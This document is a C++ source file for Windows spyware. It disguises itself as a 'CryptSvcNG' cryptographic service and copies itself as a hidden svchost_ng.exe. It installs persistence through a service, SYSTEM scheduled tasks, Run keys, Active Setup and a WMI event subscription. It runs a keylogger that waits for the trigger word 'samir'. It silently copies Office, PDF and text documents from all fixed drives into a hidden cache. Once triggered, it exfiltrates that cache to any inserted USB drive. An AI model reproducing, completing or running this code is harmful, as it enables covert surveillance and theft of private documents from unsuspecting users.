#include <windows.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <lm.h>
#include <string>
#include <vector>
#include <fstream>
#include <ctime>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cctype>

// Link libraries
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// Stealth storage path
#define STORAGE_PATH "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Store\\Cache\\"
#define SELF_DEST "C:\\Windows\\System32\\Tasks\\svchost_ng.exe"
#define SERVICE_NAME "CryptSvcNG"
#define DISPLAY_NAME "Cryptographic Services Next Generation"
#define TRIGGER_WORD "samir"
#define SCAN_INTERVAL_MS 25000
#define FILE_EXTENSIONS ".doc;.docx;.ppt;.pptx;.xls;.xlsx;.pdf;.txt;.rtf"

// Global flag for USB exfiltration trigger
bool g_bTriggered = false;
bool g_bUsbExfiltrated = false;
HANDLE g_hPipeThread = NULL;
char g_szLogBuffer[1024] = {0};

// Forward declarations
void WriteLog(const char* msg);
void SelfCopy(void);
void InstallService(void);
void InstallScheduledTasks(void);
void InstallRegistryRun(void);
void InstallActiveSetup(void);
void InstallWMI(void);
void ScanAndCopyFiles(void);
void KeyloggerThread(void);
void UsbExfilThread(void);
bool IsFileStable(const char* path);
bool DirectoryExists(const char* path);
void CreateDirectoryRecursive(const char* path);
std::string GetTimestamp(void);
std::string GetDriveLabel(char driveLetter);
std::string ToLower(const std::string& str);

// Write log to file for debugging
void WriteLog(const char* msg) {
    char logPath[MAX_PATH];
    GetEnvironmentVariableA("PUBLIC", logPath, MAX_PATH);
    strcat(logPath, "\\svchost.log");
    FILE* f = fopen(logPath, "a");
    if(f) {
        time_t t = time(NULL);
        struct tm* tm = localtime(&t);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
            tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday,
            tm->tm_hour, tm->tm_min, tm->tm_sec, msg);
        fclose(f);
    }
}

std::string ToLower(const std::string& str) {
    std::string out = str;
    std::transform(out.begin(), out.end(), out.begin(), ::tolower);
    return out;
}

bool DirectoryExists(const char* path) {
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

void CreateDirectoryRecursive(const char* path) {
    char tmp[MAX_PATH];
    strcpy(tmp, path);
    for(char* p = tmp + 3; *p; p++) {
        if(*p == '\\') {
            *p = 0;
            CreateDirectoryA(tmp, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(tmp, NULL);
}

std::string GetTimestamp(void) {
    time_t t = time(NULL);
    struct tm* tm = localtime(&t);
    char buf[64];
    sprintf(buf, "%04d%02d%02d_%02d%02d%02d",
        tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday,
        tm->tm_hour, tm->tm_min, tm->tm_sec);
    return std::string(buf);
}

bool IsFileStable(const char* path) {
    DWORD size1 = 0, size2 = 0;
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) return false;
    size1 = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    
    Sleep(2000);
    
    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) return false;
    size2 = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    
    return (size1 == size2 && size1 > 0);
}

void SelfCopy(void) {
    char myPath[MAX_PATH];
    GetModuleFileNameA(NULL, myPath, MAX_PATH);
    
    // Create destination directory
    char destDir[MAX_PATH];
    strcpy(destDir, SELF_DEST);
    char* p = strrchr(destDir, '\\');
    if(p) *p = 0;
    CreateDirectoryRecursive(destDir);
    
    // Copy self
    if(strcmp(myPath, SELF_DEST) != 0) {
        CopyFileA(myPath, SELF_DEST, FALSE);
        SetFileAttributesA(SELF_DEST, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        WriteLog("Self-copied to destination");
    }
}

void InstallService(void) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if(!hSCM) { WriteLog("OpenSCManager failed"); return; }
    
    SC_HANDLE hService = CreateServiceA(
        hSCM, SERVICE_NAME, DISPLAY_NAME,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
        SELF_DEST, NULL, NULL, NULL, NULL, NULL
    );
    
    if(hService) {
        SERVICE_DESCRIPTIONA sd = {0};
        std::string desc = "Manages cryptographic operations for the operating system";
        sd.lpDescription = const_cast<char*>(desc.c_str());
        ChangeServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
        CloseServiceHandle(hService);
        WriteLog("Service installed");
    } else {
        WriteLog("Service already exists or failed");
    }
    CloseServiceHandle(hSCM);
}

void InstallScheduledTasks(void) {
    // Using schtasks via WinExec for simplicity
    std::string cmd1 = "schtasks /create /tn \"CryptographySvcMaintenance\" /tr \"";
    cmd1 += SELF_DEST;
    cmd1 += "\" /sc onlogon /ru SYSTEM /f";
    WinExec(cmd1.c_str(), SW_HIDE);
    
    std::string cmd2 = "schtasks /create /tn \"CryptographySvcUpdate\" /tr \"";
    cmd2 += SELF_DEST;
    cmd2 += "\" /sc onidle /i 5 /ru SYSTEM /f";
    WinExec(cmd2.c_str(), SW_HIDE);
    
    WriteLog("Scheduled tasks installed");
}

void InstallRegistryRun(void) {
    HKEY hKey;
    if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "CryptSvcNG", 0, REG_SZ,
                       (BYTE*)SELF_DEST, strlen(SELF_DEST)+1);
        RegCloseKey(hKey);
    }
    
    // Also for all users
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "CryptSvcNG", 0, REG_SZ,
                       (BYTE*)SELF_DEST, strlen(SELF_DEST)+1);
        RegCloseKey(hKey);
    }
    WriteLog("Registry Run keys installed");
}

void InstallActiveSetup(void) {
    HKEY hKey;
    std::string path = "Software\\Microsoft\\Active Setup\\Installed Components\\CryptSvcNG";
    if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, path.c_str(), 0, NULL, 0,
                       KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        std::string ver = "1";
        RegSetValueExA(hKey, "StubPath", 0, REG_SZ, (BYTE*)SELF_DEST, strlen(SELF_DEST)+1);
        RegSetValueExA(hKey, "Version", 0, REG_SZ, (BYTE*)ver.c_str(), ver.length()+1);
        RegCloseKey(hKey);
        WriteLog("Active Setup installed");
    }
}

void InstallWMI(void) {
    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if(FAILED(hres)) { WriteLog("CoInitializeEx failed"); return; }
    
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL,
                                RPC_C_AUTHN_LEVEL_DEFAULT,
                                RPC_C_IMP_LEVEL_IMPERSONATE,
                                NULL, EOAC_NONE, NULL);
    
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                            IID_IWbemLocator, (LPVOID*)&pLoc);
    if(FAILED(hres)) { WriteLog("CoCreateInstance failed"); CoUninitialize(); return; }
    
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0,
                               NULL, 0, NULL, &pSvc);
    if(FAILED(hres)) { WriteLog("ConnectServer failed"); pLoc->Release(); CoUninitialize(); return; }
    
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                             NULL, EOAC_NONE);
    
    // Create __EventFilter for startup
    std::wstring wmiQuery = L"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem'";
    std::wstring filterName = L"CryptSvcFilter";
    std::wstring filterPath = L"__EventFilter.Name='CryptSvcFilter'";
    
    // Check if filter already exists
    IEnumWbemClassObject* pEnum = NULL;
    BSTR strQueryLang = SysAllocString(L"WQL");
    BSTR strQuery = SysAllocString(L"SELECT * FROM __EventFilter WHERE Name='CryptSvcFilter'");
    hres = pSvc->ExecQuery(strQueryLang, strQuery, WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
    SysFreeString(strQuery);
    SysFreeString(strQueryLang);
    
    ULONG uCount = 0;
    IWbemClassObject* pObj = NULL;
    bool exists = false;
    if(pEnum) {
        hres = pEnum->Next(WBEM_INFINITE, 1, &pObj, &uCount);
        if(SUCCEEDED(hres) && uCount > 0) exists = true;
        if(pObj) pObj->Release();
        pEnum->Release();
    }
    
    if(!exists) {
        // Create the filter
        IWbemClassObject* pFilterClass = NULL;
        IWbemClassObject* pFilter = NULL;
        hres = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
        if(SUCCEEDED(hres) && pFilterClass) {
            pFilterClass->SpawnInstance(0, &pFilter);
            VARIANT vtProp;
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            vtProp.bstrVal = _bstr_t(filterName.c_str());
            pFilter->Put(L"Name", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            vtProp.bstrVal = _bstr_t(L"WQL");
            pFilter->Put(L"QueryLanguage", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            vtProp.bstrVal = _bstr_t(wmiQuery.c_str());
            pFilter->Put(L"Query", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            hres = pSvc->PutInstance(pFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
            if(SUCCEEDED(hres)) WriteLog("WMI filter created");
            pFilter->Release();
            pFilterClass->Release();
        }
        
        // Create CommandLineEventConsumer
        IWbemClassObject* pConsumerClass = NULL;
        IWbemClassObject* pConsumer = NULL;
        hres = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
        if(SUCCEEDED(hres) && pConsumerClass) {
            pConsumerClass->SpawnInstance(0, &pConsumer);
            VARIANT vtProp;
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            vtProp.bstrVal = _bstr_t(L"CryptSvcConsumer");
            pConsumer->Put(L"Name", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            std::string cmdLine = SELF_DEST;
            vtProp.bstrVal = _bstr_t(cmdLine.c_str());
            pConsumer->Put(L"CommandLineTemplate", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            hres = pSvc->PutInstance(pConsumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
            pConsumer->Release();
            pConsumerClass->Release();
        }
        
        // Create BindsFilterToConsumer
        IWbemClassObject* pBindingClass = NULL;
        IWbemClassObject* pBinding = NULL;
        hres = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
        if(SUCCEEDED(hres) && pBindingClass) {
            pBindingClass->SpawnInstance(0, &pBinding);
            VARIANT vtProp;
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            vtProp.bstrVal = _bstr_t(filterPath.c_str());
            pBinding->Put(L"Filter", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            VariantInit(&vtProp);
            vtProp.vt = VT_BSTR;
            vtProp.bstrVal = _bstr_t(L"CommandLineEventConsumer.Name='CryptSvcConsumer'");
            pBinding->Put(L"Consumer", 0, &vtProp, 0);
            VariantClear(&vtProp);
            
            hres = pSvc->PutInstance(pBinding, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
            if(SUCCEEDED(hres)) WriteLog("WMI binding created");
            pBinding->Release();
            pBindingClass->Release();
        }
    }
    
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
}

void ScanAndCopyFiles(void) {
    // Ensure storage directory exists
    CreateDirectoryRecursive(STORAGE_PATH);
    WriteLog("Scanning for documents...");
    
    // Get all fixed drives
    DWORD drives = GetLogicalDrives();
    char root[4] = "C:\\";
    
    for(char d = 'C'; d <= 'Z'; d++) {
        if(drives & (1 << (d - 'A'))) {
            root[0] = d;
            UINT type = GetDriveTypeA(root);
            if(type == DRIVE_FIXED) {
                // Search for documents
                char searchPath[MAX_PATH];
                char extensions[256];
                strcpy(extensions, FILE_EXTENSIONS);
                
                char* ext = strtok(extensions, ";");
                while(ext) {
                    sprintf(searchPath, "%s*%s", root, ext);
                    
                    WIN32_FIND_DATAA ffd;
                    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
                    if(hFind != INVALID_HANDLE_VALUE) {
                        do {
                            if(!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                char fullPath[MAX_PATH];
                                sprintf(fullPath, "%s%s", root, ffd.cFileName);
                                
                                // Check if file is stable (not being written)
                                if(IsFileStable(fullPath)) {
                                    // Copy to storage
                                    char destPath[MAX_PATH];
                                    sprintf(destPath, "%s%s_%s", STORAGE_PATH, GetTimestamp().c_str(), ffd.cFileName);
                                    
                                    // Avoid overwriting
                                    int counter = 0;
                                    char tryPath[MAX_PATH];
                                    strcpy(tryPath, destPath);
                                    while(GetFileAttributesA(tryPath) != INVALID_FILE_ATTRIBUTES) {
                                        counter++;
                                        sprintf(tryPath, "%s%s_%d_%s", STORAGE_PATH, GetTimestamp().c_str(), counter, ffd.cFileName);
                                    }
                                    
                                    if(CopyFileA(fullPath, tryPath, FALSE)) {
                                        SetFileAttributesA(tryPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                                        char logMsg[MAX_PATH];
                                        sprintf(logMsg, "Copied: %s", ffd.cFileName);
                                        WriteLog(logMsg);
                                    }
                                }
                            }
                        } while(FindNextFileA(hFind, &ffd) != 0);
                        FindClose(hFind);
                    }
                    
                    ext = strtok(NULL, ";");
                }
                
                // Recursive directory search
                sprintf(searchPath, "%s*", root);
                WIN32_FIND_DATAA ffd;
                HANDLE hFind = FindFirstFileA(searchPath, &ffd);
                if(hFind != INVALID_HANDLE_VALUE) {
                    do {
                        if((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                           strcmp(ffd.cFileName, ".") != 0 &&
                           strcmp(ffd.cFileName, "..") != 0) {
                            // Skip Windows and ProgramData to avoid deep recursion issues
                            if(strcmp(ffd.cFileName, "Windows") == 0 ||
                               strcmp(ffd.cFileName, "ProgramData") == 0 ||
                               strcmp(ffd.cFileName, "Program Files") == 0 ||
                               strcmp(ffd.cFileName, "Program Files (x86)") == 0 ||
                               strcmp(ffd.cFileName, "$Recycle.Bin") == 0 ||
                               strcmp(ffd.cFileName, "System Volume Information") == 0 ||
                               strcmp(ffd.cFileName, "Recovery") == 0) continue;
                            
                            char subDir[MAX_PATH];
                            sprintf(subDir, "%s%s\\", root, ffd.cFileName);
                            
                            // Search this subdirectory for documents (one level deep)
                            char* ext2 = strtok(extensions, ";");
                            // Reset extensions
                            strcpy(extensions, FILE_EXTENSIONS);
                            ext2 = strtok(extensions, ";");
                            while(ext2) {
                                sprintf(searchPath, "%s*%s", subDir, ext2);
                                
                                WIN32_FIND_DATAA ffd2;
                                HANDLE hFind2 = FindFirstFileA(searchPath, &ffd2);
                                if(hFind2 != INVALID_HANDLE_VALUE) {
                                    do {
                                        if(!(ffd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                            char fullPath[MAX_PATH];
                                            sprintf(fullPath, "%s%s", subDir, ffd2.cFileName);
                                            
                                            if(IsFileStable(fullPath)) {
                                                char destPath[MAX_PATH];
                                                sprintf(destPath, "%s%s_%s", STORAGE_PATH, GetTimestamp().c_str(), ffd2.cFileName);
                                                
                                                int counter = 0;
                                                char tryPath[MAX_PATH];
                                                strcpy(tryPath, destPath);
                                                while(GetFileAttributesA(tryPath) != INVALID_FILE_ATTRIBUTES) {
                                                    counter++;
                                                    sprintf(tryPath, "%s%s_%d_%s", STORAGE_PATH, GetTimestamp().c_str(), counter, ffd2.cFileName);
                                                }
                                                
                                                if(CopyFileA(fullPath, tryPath, FALSE)) {
                                                    SetFileAttributesA(tryPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                                                    char logMsg[MAX_PATH];
                                                    sprintf(logMsg, "Copied: %s", ffd2.cFileName);
                                                    WriteLog(logMsg);
                                                }
                                            }
                                        }
                                    } while(FindNextFileA(hFind2, &ffd2) != 0);
                                    FindClose(hFind2);
                                }
                                ext2 = strtok(NULL, ";");
                                // Reset
                                strcpy(extensions, FILE_EXTENSIONS);
                            }
                        }
                    } while(FindNextFileA(hFind, &ffd) != 0);
                    FindClose(hFind);
                }
            }
        }
    }
}

std::string GetDriveLabel(char driveLetter) {
    char root[4] = {driveLetter, ':', '\\', 0};
    char volName[MAX_PATH] = {0};
    GetVolumeInformationA(root, volName, MAX_PATH, NULL, NULL, NULL, NULL, 0);
    return std::string(volName);
}

void UsbExfilThread(void) {
    WriteLog("USB exfil thread started, waiting for trigger...");
    
    // Wait for trigger
    while(!g_bTriggered) {
        Sleep(1000);
    }
    
    WriteLog("Trigger activated! Monitoring for USB drives...");
    
    // Track which drives we've already exfiltrated to
    char exfiltratedDrives[26] = {0};
    
    while(true) {
        DWORD drives = GetLogicalDrives();
        
        for(char d = 'A'; d <= 'Z'; d++) {
            if(drives & (1 << (d - 'A'))) {
                char root[4] = {d, ':', '\\', 0};
                UINT type = GetDriveTypeA(root);
                
                if(type == DRIVE_REMOVABLE && !exfiltratedDrives[d - 'A']) {
                    exfiltratedDrives[d - 'A'] = 1;
                    
                    char logMsg[128];
                    sprintf(logMsg, "USB drive detected: %c:\\", d);
                    WriteLog(logMsg);
                    
                    // Create data folder with timestamp
                    char dataFolder[MAX_PATH];
                    sprintf(dataFolder, "%c:\\Data_%s", d, GetTimestamp().c_str());
                    CreateDirectoryA(dataFolder, NULL);
                    SetFileAttributesA(dataFolder, FILE_ATTRIBUTE_HIDDEN);
                    
                    // Copy all files from storage to USB
                    char searchPath[MAX_PATH];
                    sprintf(searchPath, "%s*", STORAGE_PATH);
                    
                    WIN32_FIND_DATAA ffd;
                    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
                    if(hFind != INVALID_HANDLE_VALUE) {
                        do {
                            if(!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                char srcPath[MAX_PATH];
                                sprintf(srcPath, "%s%s", STORAGE_PATH, ffd.cFileName);
                                
                                char destPath[MAX_PATH];
                                sprintf(destPath, "%s\\%s", dataFolder, ffd.cFileName);
                                
                                if(CopyFileA(srcPath, destPath, FALSE)) {
                                    char msg[MAX_PATH];
                                    sprintf(msg, "Exfiltrated: %s to %c:\\", ffd.cFileName, d);
                                    WriteLog(msg);
                                }
                            }
                        } while(FindNextFileA(hFind, &ffd) != 0);
                        FindClose(hFind);
                    }
                    
                    // Also scan for any new documents on the USB itself
                    sprintf(searchPath, "%c:\\*%s", d, ".doc");
                    // Copy documents from USB to storage too (bidirectional)
                    char usbExt[] = ".doc;.docx;.ppt;.pptx;.xls;.xlsx;.pdf;.txt;.rtf";
                    char* ext3 = strtok(usbExt, ";");
                    while(ext3) {
                        sprintf(searchPath, "%c:\\*%s", d, ext3);
                        WIN32_FIND_DATAA ffd3;
                        HANDLE hFind3 = FindFirstFileA(searchPath, &ffd3);
                        if(hFind3 != INVALID_HANDLE_VALUE) {
                            do {
                                if(!(ffd3.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                    char fullPath[MAX_PATH];
                                    sprintf(fullPath, "%c:\\%s", d, ffd3.cFileName);
                                    
                                    char destPath[MAX_PATH];
                                    sprintf(destPath, "%s%s_%s", STORAGE_PATH, GetTimestamp().c_str(), ffd3.cFileName);
                                    
                                    int counter = 0;
                                    char tryPath[MAX_PATH];
                                    strcpy(tryPath, destPath);
                                    while(GetFileAttributesA(tryPath) != INVALID_FILE_ATTRIBUTES) {
                                        counter++;
                                        sprintf(tryPath, "%s%s_%d_%s", STORAGE_PATH, GetTimestamp().c_str(), counter, ffd3.cFileName);
                                    }
                                    
                                    if(CopyFileA(fullPath, tryPath, FALSE)) {
                                        SetFileAttributesA(tryPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                                        // Also copy to the USB data folder
                                        char usbDest[MAX_PATH];
                                        sprintf(usbDest, "%s\\%s", dataFolder, ffd3.cFileName);
                                        CopyFileA(fullPath, usbDest, FALSE);
                                        
                                        char msg[MAX_PATH];
                                        sprintf(msg, "Backup: %s from USB", ffd3.cFileName);
                                        WriteLog(msg);
                                    }
                                }
                            } while(FindNextFileA(hFind3, &ffd3) != 0);
                            FindClose(hFind3);
                        }
                        ext3 = strtok(NULL, ";");
                    }
                    
                    char doneMsg[MAX_PATH];
                    sprintf(doneMsg, "Exfiltration complete to %c:\\Data_%s", d, GetTimestamp().c_str());
                    WriteLog(doneMsg);
                }
            }
        }
        
        Sleep(5000); // Check for new USB drives every 5 seconds
    }
}

void KeyloggerThread(void) {
    WriteLog("Keylogger thread started");
    int keyIndex = 0;
    const char* trigger = TRIGGER_WORD;
    int triggerLen = strlen(trigger);
    
    while(true) {
        // Check for key press (non-blocking per key scan)
        for(int key = 0x41; key <= 0x5A; key++) { // A-Z
            if(GetAsyncKeyState(key) & 0x01) { // Key was pressed (transition from up to down)
                char c = tolower((char)key);
                
                // Check if this matches the next expected trigger character
                if(c == trigger[keyIndex]) {
                    keyIndex++;
                    if(keyIndex >= triggerLen) {
                        // Trigger word detected!
                        WriteLog("TRIGGER WORD DETECTED: samir");
                        g_bTriggered = true;
                        keyIndex = 0;
                    }
                } else {
                    // Reset if not matching
                    // But check if it matches the FIRST character (for overlapping sequences)
                    if(c == trigger[0]) {
                        keyIndex = 1;
                    } else {
                        keyIndex = 0;
                    }
                }
            }
        }
        
        Sleep(50); // Small sleep to prevent CPU spinning
    }
}

// Service main entry point
void ServiceMain(DWORD argc, LPTSTR* argv);
void ServiceCtrlHandler(DWORD ctrlCode);

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;

void ServiceCtrlHandler(DWORD ctrlCode) {
    switch(ctrlCode) {
        case SERVICE_CONTROL_STOP:
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
            break;
        default:
            break;
    }
}

void ServiceMain(DWORD argc, LPTSTR* argv) {
    g_ServiceStatusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    if(!g_ServiceStatusHandle) return;
    
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
    
    WriteLog("Service started, beginning operations...");
    
    // Start keylogger thread
    std::thread keyThread(KeyloggerThread);
    keyThread.detach();
    
    // Start USB exfil thread
    std::thread usbThread(UsbExfilThread);
    usbThread.detach();
    
    // Main scanning loop
    while(g_ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        ScanAndCopyFiles();
        Sleep(SCAN_INTERVAL_MS);
    }
}

int main(int argc, char* argv[]) {
    // Check if running as service
    if(argc > 1 && strcmp(argv[1], "-service") == 0) {
        SERVICE_TABLE_ENTRYA ServiceTable[] = {
            {(LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
            {NULL, NULL}
        };
        StartServiceCtrlDispatcherA(ServiceTable);
        return 0;
    }
    
    // Normal execution - install persistence and run
    WriteLog("=== CryptSvcNG Started ===");
    
    // Install persistence mechanisms
    SelfCopy();
    InstallService();
    InstallScheduledTasks();
    InstallRegistryRun();
    InstallActiveSetup();
    InstallWMI();
    
    // Start keylogger thread
    std::thread keyThread(KeyloggerThread);
    keyThread.detach();
    
    // Start USB exfil thread  
    std::thread usbThread(UsbExfilThread);
    usbThread.detach();
    
    // Continuous scanning loop
    WriteLog("Starting continuous document scanning...");
    while(true) {
        ScanAndCopyFiles();
        Sleep(SCAN_INTERVAL_MS);
    }
    
    return 0;
}
